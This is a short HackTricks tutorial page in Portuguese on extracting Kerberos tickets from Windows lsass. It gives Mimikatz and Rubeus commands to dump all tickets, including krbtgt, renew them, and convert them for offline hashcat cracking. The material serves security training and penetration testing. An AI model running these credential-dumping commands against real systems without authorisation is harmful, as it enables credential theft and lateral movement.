# Coletando tickets do Windows

{{#include ../../banners/hacktricks-training.md}}

Os tickets no Windows são gerenciados e armazenados pelo processo **lsass** (Local Security Authority Subsystem Service), responsável por lidar com políticas de segurança. Para extrair esses tickets, é necessário interagir com o processo lsass. Um usuário não administrativo pode acessar apenas seus próprios tickets, enquanto um administrador tem o privilégio de extrair todos os tickets do sistema. Para tais operações, as ferramentas **Mimikatz** e **Rubeus** são amplamente utilizadas, cada uma oferecendo diferentes comandos e funcionalidades.

### Mimikatz

Mimikatz é uma ferramenta versátil que pode interagir com a segurança do Windows. É usada não apenas para extrair tickets, mas também para várias outras operações relacionadas à segurança.
```bash
# Extracting tickets using Mimikatz
sekurlsa::tickets /export
```
### Rubeus

Rubeus é uma ferramenta especificamente projetada para interação e manipulação do Kerberos. É usada para extração e manuseio de tickets, bem como outras atividades relacionadas ao Kerberos.
```bash
# Dumping all tickets using Rubeus
.\Rubeus dump
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Listing all tickets
.\Rubeus.exe triage

# Dumping a specific ticket by LUID
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Renewing a ticket
.\Rubeus.exe renew /ticket:<BASE64_TICKET>

# Converting a ticket to hashcat format for offline cracking
.\Rubeus.exe hash /ticket:<BASE64_TICKET>
```
Ao usar esses comandos, certifique-se de substituir os marcadores de posição como `<BASE64_TICKET>` e `<luid>` pelo ticket codificado em Base64 e pelo ID de Logon reais, respectivamente. Essas ferramentas oferecem uma funcionalidade extensa para gerenciar tickets e interagir com os mecanismos de segurança do Windows.

## Referências

- [https://www.tarlogic.com/en/blog/how-to-attack-kerberos/](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
